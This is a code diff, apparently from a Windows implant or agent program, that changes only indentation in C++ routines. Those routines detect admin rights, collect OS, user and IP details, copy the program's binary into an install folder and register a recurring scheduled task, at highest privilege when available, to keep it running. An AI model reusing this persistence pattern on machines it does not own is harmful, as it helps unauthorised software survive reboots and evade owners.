@@ -39,34 +39,34 @@ std::string getCmdOutput(const std::string& cmd) {
 }
 
 bool isSuperuser() {
-	if (IS_SUPERUSER_IS_CACHED) {
-		return IS_SUPERUSER;
-	} else {
-		IS_SUPERUSER = (util::getCmdOutput("net session")).size();
-		IS_SUPERUSER_IS_CACHED = true;
+    if (IS_SUPERUSER_IS_CACHED) {
+        return IS_SUPERUSER;
+    } else {
+        IS_SUPERUSER = (util::getCmdOutput("net session")).size();
+        IS_SUPERUSER_IS_CACHED = true;
 
-		return IS_SUPERUSER;
-	}
+        return IS_SUPERUSER;
+    }
 }
 
 std::string getInstallDir() {
-	std::string installDir;
-	if (util::isSuperuser()) {
-		installDir = ADMIN_INSTALL_DIR + "\\";
-	} else {
-		installDir = std::getenv("USERPROFILE") + ("\\" + INSTALL_DIR + "\\");
-	}
+    std::string installDir;
+    if (util::isSuperuser()) {
+        installDir = ADMIN_INSTALL_DIR + "\\";
+    } else {
+        installDir = std::getenv("USERPROFILE") + ("\\" + INSTALL_DIR + "\\");
+    }
 
-	return installDir;
+    return installDir;
 }
 
 std::string getOS() {
-	std::string winVersion = util::getCmdOutput("systeminfo | findstr /B /C:\"OS Name\"");
-	std::regex pattern("[\\n\\r\\s]*.*?(Windows\\s*\\S+).*[\\n\\r\\s]*");
-	std::smatch match;
-	std::regex_match(winVersion, match, pattern);
+    std::string winVersion = util::getCmdOutput("systeminfo | findstr /B /C:\"OS Name\"");
+    std::regex pattern("[\\n\\r\\s]*.*?(Windows\\s*\\S+).*[\\n\\r\\s]*");
+    std::smatch match;
+    std::regex_match(winVersion, match, pattern);
 
-	return match[1];
+    return match[1];
 }
 
 std::string getUser() {
@@ -87,22 +87,22 @@ std::string getIPAddr() {
 namespace install {
 
 void installFiles() {
-	std::string installDir = util::getInstallDir();
+    std::string installDir = util::getInstallDir();
     std::system(("mkdir " + installDir).c_str());
-	copyFile(BIN, installDir + BIN_NEW);
+    copyFile(BIN, installDir + BIN_NEW);
 }
 
 void initRecurringJob() {
     // Schedule task for Windows
-	std::string installDir = util::getInstallDir();
-	std::string taskCommand =
-		"schtasks.exe /create /F /tn " + TASK_NAME
-		+ " /sc " + TASK_FREQ
-		+ " /mo " + TASK_FREQ_VALUE
-		+ " /tr " + installDir + BIN_NEW;
-	if (util::isSuperuser()) {
-		taskCommand += " /rl highest";
-	}
+    std::string installDir = util::getInstallDir();
+    std::string taskCommand =
+        "schtasks.exe /create /F /tn " + TASK_NAME
+        + " /sc " + TASK_FREQ
+        + " /mo " + TASK_FREQ_VALUE
+        + " /tr " + installDir + BIN_NEW;
+    if (util::isSuperuser()) {
+        taskCommand += " /rl highest";
+    }
 
     std::system(taskCommand.c_str());
 }
